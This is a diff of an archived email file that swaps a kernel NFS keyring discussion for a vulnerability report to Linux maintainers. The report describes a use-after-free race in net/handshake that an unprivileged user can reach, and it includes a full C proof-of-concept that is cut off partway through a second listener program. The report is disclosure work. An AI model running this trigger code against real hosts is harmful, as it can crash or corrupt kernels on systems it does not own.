@@ -1,118 +1,864 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj2-f43.google.com (mail-pj2-f43.google.com [74.125.227.171])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9388B282F0C;
-	Sat, 19 Sep 2026 16:23:23 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E2DBA3B3C0F
+	for <kernel-tls-handshake@lists.linux.dev>; Sun, 20 Sep 2026 17:04:46 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.171
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789835004; cv=none; b=CqjbCG7/tvBmPE/HgyN3MqmtAFSYjxsJtmwf0Udw3vyOVGKxrQbVnLdvLtYxika225imWl9ZGTcNbwyJp5sr7hzlYXCIMi9GXbjME9SeWnzvvUB3a7N/meo+Sn/UnMbd74KFpFG0qD3lIxOrJh3HVKKxYFSq9k8Jeoc4pDeJkso=
+	t=1789923888; cv=none; b=BCuSoSZkIHuqlMG+Hcg7M+KWj9XOmrnoKplah93BNHC+3EpBTQafe5RuotPTWREVv6hIUOODL3yzYSEDCkGebSsNoppotTA9bYt4cTd3XCCK2iHl0E98+ddowBTtcwnddMexwEEZ5hcNsG8kg5ePtKAjkwKYAROGGv1P043uhFA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789835004; c=relaxed/simple;
-	bh=rCfku23NV4rHOcA4C6xP0o0XxycvahRnuUmJxepMU10=;
-	h=MIME-Version:Date:From:To:Cc:Message-Id:In-Reply-To:References:
-	 Subject:Content-Type; b=Qu9zpX2vz4nXigJ+EUb+/qLjs0qv3RkB5YY1GZqZYO/Zog+0bGZU76BVnD8Cjzd5MRevT9AfLwNKqB0Y72gu9Zq1NZ2auu2HruW1m332DEjWLeFZ2a4af7Z1JauJLlJIDLpHe9ad1X/br6kMZbGN2IhDVxTE6HmaZuzHrAefpAI=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=DP6wtNOV; arc=none smtp.client-ip=100.103.45.18
+	s=arc-20240116; t=1789923888; c=relaxed/simple;
+	bh=Uwr8hw8y9yI063/qJQ3QE7ZY1IlUwno3rd+uTvjAMKQ=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kKXUo9EnfUQSLF6BQX1bwFK3qheop+CU43z0jsMoJOC38e6LLF/3s0IgSFVcgYYsnlICCTbs2IufEDC3cvm7y2xby7gJiuowdV6csQnSCY1wK40lMHp22MAUhMF2xz5hxibaHyAgdnZrJ/oIm24dZY/H7CeOLL0UpFqXfgXMU8U=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=KpXkiKDZ; arc=none smtp.client-ip=74.125.227.171
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="DP6wtNOV"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 08D511F00893;
-	Sat, 19 Sep 2026 16:23:22 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1789835003;
-	bh=C4lRm3RTYNV9mhdEEDcZuzTAV6oSYrE2Pr2mgjuhYUs=;
-	h=Date:From:To:Cc:In-Reply-To:References:Subject;
-	b=DP6wtNOViiARae2q4SCrhAyAjFH8KgPwEw8WLAjQbJOmdm/ox8AuLydIJPBO14wzF
-	 HFAChnG/jXzQrTMR5ZK6knAFEquuyvHrYDZAwcFqYUvi1EjMCI+X5rzt6VY5ZL/iHG
-	 0z1aQ23qMJldHrWn9H92GNf/ye+WhPPjhGW20uydqgrUskzcrrmCuDSoVhP46a2LZh
-	 HHBa8M1cx6qDFj4tXSRS6F9xeEjIhmvnHd8Y27NoBO76AWVxuIK516mD/JsaprktZ3
-	 MW3uhHSmeYwS9+x6syOn5B9fjrZRnMchpUbr/cu7/vdqI/FfxOlPWDC10YfPkZPNJ1
-	 pADuEyXzxvOww==
-Received: from phl-compute-10.internal (phl-compute-10.internal [10.202.2.50])
-	by mailfauth.phl.internal (Postfix) with ESMTP id 3CD09F40066;
-	Sat, 19 Sep 2026 12:23:22 -0400 (EDT)
-Received: from phl-imap-15 ([10.202.2.104])
-  by phl-compute-10.internal (MEProxy); Sat, 19 Sep 2026 12:23:22 -0400
-X-ME-Sender: <xms:-rauao4lVNwNJfYCW_uP-vocWLYXA57nbVKefMKFSueq83qGmQNR0g>
-    <xme:-rauaktlCAjPoyAVKnoGlmCs-uiF8aJELr9aOxjX_GfQZ0u0oAvLRmMqOMEtIsfjr
-    I6OklI6iYn2IlD3A2gCrUwiQ2TN2N5EtY9AsFQS7-M5cvesT_tPGIK1>
-X-ME-Proxy-Cause: dmFkZTEthDnEnTNzGgkWQatgFds47X3LBSfUEYm0c0ZV4go8jNCGUPTrclDhUI/156RFd1
-    /El8fx5I9rXFPLoY0rOdO+CyvUB20WNDyuUvNd2rs4whvxrwYkFwqFWAmZgOmYRfacooGf
-    Hsno+CrK28XrP4pQiCXO6I6fHLBpX/OBZF+5vqlcEnKmpro4D07Z2TnxgKtKoOSx/EeJDk
-    Glh7d3bJXB4TtCB4mrfUOOjA1WR4nLQRvqMBgn54Es+OSfZ189mocfqS/A9z+Kd5oWwiwW
-    86mNzGJRzE9jVo6E5PFLeFEEOUwbtSi/ySCoXWBN2XGCZ3xIfVvCq4ajWkUJmBxFEmQimT
-    yC+8CFFp++nh1Gpgkl715haFfzOTVJ/BzvU8Gx+DnRZCcTYqkgydL48eoVhKA/T5FilLjA
-    Dlt7oirURHzjF0M82ZLTxtGLHyauKFB/8HnR8JfpLOvtcGwV5uM34/lP0Sq+0vVf69FBq+
-    maWUY544pdxmFhCrzgofqT+an5vcltd5DUBUZMUVergbT/Ys4m587z0p2E4/sMF0MPt8Za
-    GU8LWqsNyXiXI/Ds6McbcCRBFCGuIEnCV9pp+L3pjJJPEXC7iiQJrtRFC+udc9dhm+nkQa
-    zbeHlIr8F7p0/KKumF2T33Ufu5AYehf5+PnQLasaD8Sbf+3/hPH8b3AkzhXA
-X-ME-Proxy: <xmx:-rauakSPik5hohjS6WVR9oHq5r_BBrZPo3dvSwBB-finccobpzOMRQ>
-    <xmx:-rauamrvN3Uo0LBKIxAWvTdijVNQPYe3GQ23koadj-FULtE5n7XeJg>
-    <xmx:-rauaqZ07v50s4_DfQGFKTF3emwXKCRee_eK2NpO97SdwAHO-gFQiw>
-    <xmx:-rauapQdYCHkzEQghnYFCbsUHPZJVlE3gM29Y4e4-3NHaZQmIXRwqQ>
-    <xmx:-rauagd3AzYaAnJtbeI88yDbi6C35PSvLiLIFpVbc0bNx1vNO-i5QQpW>
-Feedback-ID: ifa6e4810:Fastmail
-Received: by mailuser.phl.internal (Postfix, from userid 501)
-	id 1A66E780070; Sat, 19 Sep 2026 12:23:22 -0400 (EDT)
-X-Mailer: MessagingEngine.com Webmail Interface
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="KpXkiKDZ"
+Received: by mail-pj2-f43.google.com with SMTP id 98e67ed59e1d1-396cccbba92so2037771a91.0
+        for <kernel-tls-handshake@lists.linux.dev>; Sun, 20 Sep 2026 10:04:46 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1789923886; x=1790528686; darn=lists.linux.dev;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=vgYFDxzEBcrBmuUJWA4nlEximFEGVLuVzcLRZutaBYo=;
+        b=KpXkiKDZVDqR4VpL/xvSUEFNg3SBiAotjUqxYpwKgA1WGlQYdlGwLrxE+X26wF7Ha+
+         vmCLQ9oenDH7Nn/gXh14r3S8VCeGfyA/oys3IEp7a6nqXoqn5Z6ONhDBJqkg8kaVg7si
+         lzFuId7aV4wMvlyELE+6IoWDReMOBw87osCOtXdhmPldcjMU4GwxuCJX5cbfJU/OHQ5f
+         s82mFHX9w0FzS7p6vkC2pVhVGpfh5I29KpALGbm6FpWWm6fGaNLR+3sLPyQTJOX9hEMD
+         98rz/itBBS2XOXleEgHGY9Xgw549QEttC7e58Fim0dXvZPZtEiX7muGHETFIeJNLjIe9
+         pAaA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789923886; x=1790528686;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=vgYFDxzEBcrBmuUJWA4nlEximFEGVLuVzcLRZutaBYo=;
+        b=mz9A1/qPYSES+keCoHwNqHi6eCMvcwd7ql60xta42yOEqDB98Ra9GcluvWVbrpf6GL
+         Uc9UkAsdPbuAYdMFB+Ud7kS02OG7Vu7rFUdVgP/NkXTbB0Rb9vpSB17qoi3l4Rrewr9y
+         Mxmi78uSA0GRhNYaXC9WUoffYuBISJ3VVrxuEjfvSG+c2wqcwcZ9O6jHiRCgKP+EONCZ
+         lY1OHsqR4qrqyWC19p1IELfNpymGhZOAQd/Wonf8hPq4SoYhXHnN9gFYOtBjGr6UuWor
+         gVcLOwRH6m2DOy9puOl1lw8BLv7PCdSy05r6oSzq+Mxyd9GnTajNYMDTwenqsX7jAN03
+         bdvw==
+X-Gm-Message-State: AFuF++l8u3Z5N6QV50VEGido6Uc9q9tW4OWlU19B+CowtdegTYSG4dLk
+	wl/1+jLy2Rfge60/mdXY0OtB6OmJoERkX7tY6m6gSqL0fcLH3dL8bN4ynBHJBYwYcm1KBRBNnq+
+	JbMJJlA==
+X-Gm-Gg: AYBFou0wVPpL97EhGFkVAK3swAqyWsGu5Ie9AXSVv4a825AeccMJDDS92Dg2BS8cwN9
+	Ap0DQratLIswrYdamxsRgJW4+dAV0dTq9Sa60260jRJaQly243rBimOc0lYjFHq/NMzv9Q27BIY
+	QJjLg3PmIGxqkA5Gat6a0zRXv+/1+T6iTN2aGiLFKwR0pv63abgilF+40zHlBFFeeTkqn0ZxOsL
+	fjCnA8p/ov/PvE7mKdNc7EdbKSU4qk61tNQBXgEUZUrLQAQlKxKgQS7/tEp6VI29TBYNYJd1lCJ
+	+AOMfMejCf71RI2Ev2+YYxCQCT90GBeI3soUyKzf8CPcGOX3er6YaRC6//NkatyIn5NDl3aqCve
+	zylAJV+aZesbUQk/1O0kCYuO3w5ENNgsPqwQkUEE1qoOssJ/jMQGeYACceAuQ1lXIrlcj5EMT/s
+	vhJ3Oa5ardzRHtQGMRB27uvnx/tfMbD6gKwmVSoI9xdkUNt35fyO0W0Vp87QGJolhfO3eFkhu/K
+	bM3POgN7g==
+X-Received: by 2002:a17:90b:398c:b0:3a0:46c7:7c47 with SMTP id 98e67ed59e1d1-3a046c77f24mr1045600a91.37.1789923885868;
+        Sun, 20 Sep 2026 10:04:45 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a041b87bfesm2639291a91.3.2026.09.20.10.04.37
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sun, 20 Sep 2026 10:04:45 -0700 (PDT)
+From: Ren Wei <weir@nebusec.ai>
+To: kernel-tls-handshake@lists.linux.dev,
+	netdev@vger.kernel.org
+Cc: cel@kernel.org,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	vega@nebusec.ai,
+	sashiko-bot@kernel.org,
+	rakukuip@gmail.com,
+	weir@nebusec.ai
+Subject: [PATCH net 0/1] net/handshake: Protect request hash lookups
+Date: Mon, 21 Sep 2026 01:04:12 +0800
+Message-ID: <cover.1789819174.git.rakukuip@gmail.com>
+X-Mailer: git-send-email 2.53.0
 Precedence: bulk
 X-Mailing-List: kernel-tls-handshake@lists.linux.dev
 List-Id: <kernel-tls-handshake.lists.linux.dev>
 List-Subscribe: <mailto:kernel-tls-handshake+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:kernel-tls-handshake+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-X-ThreadId: Ak1fuKNIJ_kR
-Date: Sat, 19 Sep 2026 12:22:53 -0400
-From: "Chuck Lever" <cel@kernel.org>
-To: "Hannes Reinecke" <hare@suse.de>
-Cc: "Trond Myklebust" <trondmy@kernel.org>,
- "Anna Schumaker" <anna@kernel.org>, "David S. Miller" <davem@davemloft.net>,
- "Eric Dumazet" <edumazet@google.com>, "Jakub Kicinski" <kuba@kernel.org>,
- "Paolo Abeni" <pabeni@redhat.com>, "Simon Horman" <horms@kernel.org>,
- "Jonathan Corbet" <corbet@lwn.net>, "Shuah Khan" <skhan@linuxfoundation.org>,
- "Randy Dunlap" <rdunlap@infradead.org>,
- "Christian Brauner" <brauner@kernel.org>,
- "David Howells" <dhowells@redhat.com>, "Sagi Grimberg" <sagi@grimberg.me>,
- linux-nfs@vger.kernel.org, keyrings@vger.kernel.org,
- kernel-tls-handshake@lists.linux.dev, netdev@vger.kernel.org,
- linux-doc@vger.kernel.org
-Message-Id: <ebaeb3c9-839c-4ad7-8573-baa68e8c64d0@slotpi15m67>
-In-Reply-To: <bbc4ff6f-aa38-4862-96fe-518c3b4df4d6@suse.de>
-References: <20260918-nfs-mtls-identity-v1-0-197e568d78a7@kernel.org>
- <20260918-nfs-mtls-identity-v1-2-197e568d78a7@kernel.org>
- <bbc4ff6f-aa38-4862-96fe-518c3b4df4d6@suse.de>
-Subject: Re: [PATCH RFC 2/5] NFS: allocate the .nfs keyring per network namespace
-Content-Type: text/plain
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 
-On 9/18/26 10:44 AM, Hannes Reinecke wrote:
-> Thing is, when running within a container (eg a docker one) access
-> access to /proc/keys might be restricted, and from what I've
-> gathered each container gets its own, _empty_ keyring.
-> (certainly an empty session keyring ...).
+From: Luxiao Xu <rakukuip@gmail.com>
 
-IMO, neither one affects patch 5. The key type has its own request_key
-handler, so construct_key() calls it in the requesting task's context.
-There's no upcall, no /proc/keys. It reports the .nfs keyring of
-current->nsproxy->net_ns, and KEY_TYPE_NET_DOMAIN keeps a key
-instantiated in one netns from answering another. An empty session
-keyring is a fine destination, and with no session keyring at all
-look_up_user_keyrings() creates a per-user-namespace one on demand.
+Hi Linux kernel maintainers,
 
-What does break is add_key() into the .nfs keyring from a container
-with its own user namespace. Patch 2 allocates it owned by global
-root with no OTH permissions, so a root mapped to a non-zero kuid
-gets EACCES. A netns-only container (Docker's default) works end to
-end. NFS is not FS_USERNS_MOUNT either, so whoever mounts on behalf
-of a user-ns container can provision the keyring too. If a
-netns-owned keyring is wanted anyway, patch 2 can allocate it with
-net->user_ns->owner instead of GLOBAL_ROOT_UID. I'd like the
-keyrings folks to weigh in on that, please.
+We found and validated a issue in net/handshake/request.c. The bug is
+reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-Regarding the idea of letting each container create its own keyring,
-the kernel still has to learn which keyring to link into tlshd for a
-handshake, and the serial number in the handshake request already
-carries that. The per-namespace allocation decides only who creates
-the keyring and who owns it, not how it is named on the wire.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
+---- details below ----
+
+Bug details:
+
+handshake_req_hash_lookup() uses rhashtable_lookup_fast(), which drops
+the RCU read lock internally and returns a naked pointer without taking
+any lifetime reference.
+
+When handshake_req_submit() encounters an error during notification
+(such as when the generic-netlink multicast receive queues are filled and
+handshake_genl_notify() fails), it removes the request from the pending
+list and immediately frees it synchronously via handshake_req_destroy()
+and kfree().
+
+If an asynchronous transport teardown or cancellation races that unwind,
+concurrent callers such as tls_handshake_close(), handshake_req_cancel(),
+or handshake_nl_done_doit() look up the request and dereference freed
+memory. In addition, the rhashtable lookup itself races with kfree(),
+leading to a KASAN panic in memcmp.
+
+Furthermore, handshake_req_next() dequeues a pending request without
+taking a reference on the request. If FD_PREPARE() or hp_accept() fails
+after a concurrent cancellation or socket close has released the submit
+file pin, dropping the file pin in handshake_nl_accept_doit() can trigger
+socket destruction immediately, freeing the request before
+handshake_complete() or trace_handshake_cmd_accept_err() completes.
+
+Root cause:
+handshake_req_hash_lookup() returns a request pointer without acquiring
+a reference count under RCU protection, and handshake_req_destroy() frees
+the request memory synchronously via kfree() without waiting for an RCU
+grace period. In addition, handshake_req_next() does not hold a request
+lifetime reference across the accept preparation and error paths.
+
+Reproducer:
+
+    ./poc.sh
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/genetlink.h>
+#include <linux/netlink.h>
+#include <netinet/tcp.h>
+#include <pthread.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+
+#ifndef NLA_ALIGNTO
+#define NLA_ALIGNTO 4
+#endif
+#ifndef NLA_ALIGN
+#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
+#endif
+#ifndef NLA_HDRLEN
+#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
+#endif
+#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
+#define NLA_NEXT(nla, attrlen) \
+	((attrlen) -= NLA_ALIGN((nla)->nla_len), \
+	 (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
+#define NLA_OK(nla, len) \
+	((len) >= (int)sizeof(struct nlattr) && (nla)->nla_len >= sizeof(struct nlattr) && \
+	 (nla)->nla_len <= (len))
+
+struct rpc_probe {
+	uint32_t recmark;
+	uint32_t xid;
+	uint32_t msg_type;
+	uint32_t rpcvers;
+	uint32_t prog;
+	uint32_t vers;
+	uint32_t proc;
+	uint32_t cred_flavor;
+	uint32_t cred_len;
+	uint32_t verf_flavor;
+	uint32_t verf_len;
+};
+
+struct worker_arg {
+	const struct sockaddr_in *addr;
+	unsigned int delay_us;
+	unsigned int attempts;
+	unsigned int id;
+};
+
+static atomic_uint global_xid = 0x41410000;
+static atomic_ulong total_attempts;
+static atomic_int stop_now;
+
+static int nl_open(void)
+{
+	struct sockaddr_nl addr = {
+		.nl_family = AF_NETLINK,
+	};
+	int fd;
+
+	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_GENERIC);
+	if (fd < 0)
+		return -1;
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+		close(fd);
+		return -1;
+	}
+	return fd;
+}
+
+static int nl_send_getfamily(int fd, const char *family)
+{
+	struct {
+		struct nlmsghdr nlh;
+		struct genlmsghdr genl;
+		struct nlattr nla;
+		char name[32];
+	} req = {
+		.nlh = {
+			.nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN),
+			.nlmsg_type = GENL_ID_CTRL,
+			.nlmsg_flags = NLM_F_REQUEST,
+			.nlmsg_seq = 1,
+		},
+		.genl = {
+			.cmd = CTRL_CMD_GETFAMILY,
+			.version = 1,
+		},
+		.nla = {
+			.nla_type = CTRL_ATTR_FAMILY_NAME,
+		},
+	};
+	size_t len = strlen(family) + 1;
+
+	if (len > sizeof(req.name)) {
+		errno = ENAMETOOLONG;
+		return -1;
+	}
+
+	memcpy(req.name, family, len);
+	req.nla.nla_len = NLA_HDRLEN + len;
+	req.nlh.nlmsg_len += NLMSG_ALIGN(req.nla.nla_len);
+
+	return send(fd, &req, req.nlh.nlmsg_len, 0);
+}
+
+static int parse_mcast_group_id(const char *buf, ssize_t len, const char *group)
+{
+	const struct nlmsghdr *nlh;
+
+	for (nlh = (const struct nlmsghdr *)buf; NLMSG_OK(nlh, len);
+	     nlh = NLMSG_NEXT(nlh, len)) {
+		const struct genlmsghdr *genl;
+		int attrlen;
+		const struct nlattr *attr;
+
+		if (nlh->nlmsg_type == NLMSG_ERROR)
+			return -1;
+
+		genl = NLMSG_DATA(nlh);
+		attr = (const struct nlattr *)((const char *)genl + GENL_HDRLEN);
+		attrlen = nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
+
+		for (; NLA_OK(attr, attrlen); attr = NLA_NEXT(attr, attrlen)) {
+			if (attr->nla_type != CTRL_ATTR_MCAST_GROUPS)
+				continue;
+
+			int nested_len = attr->nla_len - NLA_HDRLEN;
+			const struct nlattr *entry =
+				(const struct nlattr *)((const char *)attr + NLA_HDRLEN);
+
+			for (; NLA_OK(entry, nested_len);
+			     entry = NLA_NEXT(entry, nested_len)) {
+				int grp_len = entry->nla_len - NLA_HDRLEN;
+				const struct nlattr *grp =
+					(const struct nlattr *)((const char *)entry + NLA_HDRLEN);
+				const char *name = NULL;
+				uint32_t id = 0;
+
+				for (; NLA_OK(grp, grp_len); grp = NLA_NEXT(grp, grp_len)) {
+					if (grp->nla_type == CTRL_ATTR_MCAST_GRP_NAME)
+						name = NLA_DATA(grp);
+					else if (grp->nla_type == CTRL_ATTR_MCAST_GRP_ID)
+						memcpy(&id, NLA_DATA(grp), sizeof(id));
+				}
+				if (name && strcmp(name, group) == 0)
+					return (int)id;
+			}
+		}
+	}
+
+	errno = ENOENT;
+	return -1;
+}
+
+static int nl_resolve_mcast_group(const char *family, const char *group)
+{
+	char buf[8192];
+	int fd, id;
+	ssize_t len;
+
+	fd = nl_open();
+	if (fd < 0)
+		return -1;
+	if (nl_send_getfamily(fd, family) < 0) {
+		close(fd);
+		return -1;
+	}
+
+	len = recv(fd, buf, sizeof(buf), 0);
+	close(fd);
+	if (len < 0)
+		return -1;
+
+	id = parse_mcast_group_id(buf, len, group);
+	return id;
+}
+
+static int *open_listeners(unsigned int count)
+{
+	int group_id;
+	int *fds;
+
+	group_id = nl_resolve_mcast_group("handshake", "tlshd");
+	if (group_id < 0) {
+		perror("resolve handshake tlshd group");
+		return NULL;
+	}
+
+	fds = calloc(count, sizeof(*fds));
+	if (!fds)
+		return NULL;
+
+	for (unsigned int i = 0; i < count; i++) {
+		int fd;
+		int rcvbuf = 1024;
+
+		fd = nl_open();
+		if (fd < 0) {
+			perror("nl_open");
+			count = i;
+			break;
+		}
+		setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
+		if (setsockopt(fd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP,
+			       &group_id, sizeof(group_id)) < 0) {
+			perror("NETLINK_ADD_MEMBERSHIP");
+			close(fd);
+			count = i;
+			break;
+		}
+		fds[i] = fd;
+	}
+
+	fprintf(stderr, "opened %u multicast listeners on group %d\n",
+		count, group_id);
+	return fds;
+}
+
+static void close_listeners(int *fds, unsigned int count)
+{
+	if (!fds)
+		return;
+	for (unsigned int i = 0; i < count; i++)
+		if (fds[i] > 0)
+			close(fds[i]);
+	free(fds);
+}
+
+static void on_signal(int sig)
+{
+	(void)sig;
+	atomic_store(&stop_now, 1);
+}
+
+static int send_probe(const struct sockaddr_in *addr, unsigned int delay_us)
+{
+	struct rpc_probe probe = {
+		.recmark = htonl(0x80000028),
+		.xid = htonl(atomic_fetch_add(&global_xid, 1)),
+		.msg_type = htonl(0),
+		.rpcvers = htonl(2),
+		.prog = htonl(100003),
+		.vers = htonl(4),
+		.proc = htonl(0),
+		.cred_flavor = htonl(7),
+		.cred_len = htonl(0),
+		.verf_flavor = htonl(0),
+		.verf_len = htonl(0),
+	};
+	struct linger ling = { .l_onoff = 1, .l_linger = 0 };
+	const int one = 1;
+	int fd;
+	ssize_t n;
+
+	fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+	if (fd < 0)
+		return -1;
+
+	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
+	setsockopt(fd, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
+
+	if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)) < 0) {
+		close(fd);
+		return -1;
+	}
+
+	n = send(fd, &probe, sizeof(probe), MSG_NOSIGNAL);
+	if (n != sizeof(probe)) {
+		close(fd);
+		return -1;
+	}
+
+	if (delay_us) {
+		struct timespec ts = {
+			.tv_sec = delay_us / 1000000U,
+			.tv_nsec = (long)(delay_us % 1000000U) * 1000L,
+		};
+
+		nanosleep(&ts, NULL);
+	}
+
+	close(fd);
+	return 0;
+}
+
+static void *worker(void *data)
+{
+	const struct worker_arg *arg = data;
+	unsigned int i = 0;
+
+	while (!atomic_load(&stop_now)) {
+		if (arg->attempts && i >= arg->attempts)
+			break;
+		send_probe(arg->addr, arg->delay_us);
+		atomic_fetch_add(&total_attempts, 1);
+		i++;
+	}
+
+	fprintf(stderr, "worker %u done after %u attempts\n", arg->id, i);
+	return NULL;
+}
+
+static unsigned int parse_u32(const char *s, const char *name)
+{
+	char *end;
+	unsigned long v;
+
+	errno = 0;
+	v = strtoul(s, &end, 0);
+	if (errno || !s[0] || *end || v > UINT32_MAX) {
+		fprintf(stderr, "invalid %s: %s\n", name, s);
+		exit(1);
+	}
+	return (unsigned int)v;
+}
+
+int main(int argc, char **argv)
+{
+	struct sockaddr_in addr = {
+		.sin_family = AF_INET,
+		.sin_port = htons(2049),
+	};
+	int *listener_fds = NULL;
+	struct worker_arg *args;
+	pthread_t *threads;
+	unsigned int workers = 32;
+	unsigned int delay_us = 2000;
+	unsigned int attempts = 0;
+	unsigned int listeners = 0;
+	unsigned int port = 2049;
+	int opt;
+	int rc = 0;
+
+	while ((opt = getopt(argc, argv, "h:p:t:d:n:l:")) != -1) {
+		switch (opt) {
+		case 'h':
+			if (inet_pton(AF_INET, optarg, &addr.sin_addr) != 1) {
+				fprintf(stderr, "invalid host: %s\n", optarg);
+				return 1;
+			}
+			break;
+		case 'p':
+			port = parse_u32(optarg, "port");
+			if (port > 65535) {
+				fprintf(stderr, "invalid port: %u\n", port);
+				return 1;
+			}
+			addr.sin_port = htons(port);
+			break;
+		case 't':
+			workers = parse_u32(optarg, "threads");
+			break;
+		case 'd':
+			delay_us = parse_u32(optarg, "delay_us");
+			break;
+		case 'n':
+			attempts = parse_u32(optarg, "attempts");
+			break;
+		case 'l':
+			listeners = parse_u32(optarg, "listeners");
+			break;
+		default:
+			fprintf(stderr,
+				"usage: %s [-h host] [-p port] [-t threads] [-d delay_us] [-n attempts_per_thread] [-l listeners]\n",
+				argv[0]);
+			return 1;
+		}
+	}
+
+	if (!addr.sin_addr.s_addr)
+		inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
+
+	signal(SIGINT, on_signal);
+	signal(SIGTERM, on_signal);
+
+	if (listeners) {
+		listener_fds = open_listeners(listeners);
+		if (!listener_fds) {
+			fprintf(stderr, "failed to open listeners\n");
+			return 1;
+		}
+	}
+
+	threads = calloc(workers, sizeof(*threads));
+	args = calloc(workers, sizeof(*args));
+	if (!threads || !args) {
+		perror("calloc");
+		return 1;
+	}
+
+	fprintf(stderr,
+		"target=%s:%u threads=%u delay_us=%u attempts_per_thread=%u listeners=%u\n",
+		inet_ntoa(addr.sin_addr), port, workers, delay_us, attempts, listeners);
+
+	for (unsigned int i = 0; i < workers; i++) {
+		args[i].addr = &addr;
+		args[i].delay_us = delay_us;
+		args[i].attempts = attempts;
+		args[i].id = i;
+		rc = pthread_create(&threads[i], NULL, worker, &args[i]);
+		if (rc) {
+			errno = rc;
+			perror("pthread_create");
+			atomic_store(&stop_now, 1);
+			workers = i;
+			break;
+		}
+	}
+
+	for (unsigned int i = 0; i < workers; i++)
+		pthread_join(threads[i], NULL);
+
+	fprintf(stderr, "total_attempts=%lu\n",
+		(unsigned long)atomic_load(&total_attempts));
+	close_listeners(listener_fds, listeners);
+	free(args);
+	free(threads);
+	return 0;
+}
+------END poc.c--------
+
+------BEGIN listener.c------
+#include <errno.h>
+#include <netlink/genl/genl.h>
+#include <netlink/genl/ctrl.h>
+#include <netlink/netlink.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+static volatile sig_atomic_t stop_now;
+
+static void on_signal(int sig)
+{
+	(void)sig;
+	stop_now = 1;
+}
+
+static unsigned int parse_u32(const char *s, const char *name)
+{
+	char *end;
+	unsigned long v;
+
+	errno = 0;
+	v = strtoul(s, &end, 0);
+	if (errno || !s[0] || *end || v > 1000000UL) {
+		fprintf(stderr, "invalid %s: %s\n", name, s);
+		exit(1);
+	}
+	return (unsigned int)v;
+}
+
+int main(int argc, char **argv)
+{
+	struct nl_sock **socks;
+	unsigned int count = 256;
+	int grp;
+
+	if (argc > 1)
